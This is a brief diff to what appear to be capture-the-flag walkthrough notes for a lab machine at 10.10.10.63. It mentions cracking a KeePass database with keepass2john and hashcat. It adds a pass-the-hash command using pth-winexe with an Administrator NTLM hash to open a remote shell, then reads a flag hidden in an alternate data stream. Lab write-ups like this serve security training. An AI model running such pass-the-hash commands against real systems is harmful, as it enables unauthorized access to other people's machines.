@@ -51,6 +51,7 @@ keepass2john CEH.kdbx
 cp result like:
 https://hashcat.net/wiki/doku.php?id=example_hashes
 
+pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
 
-
-
+c:\Users\Administrator\Desktop>dir /r
+powershell Get-Content -Path "hm.txt" -Stream "root.txt"
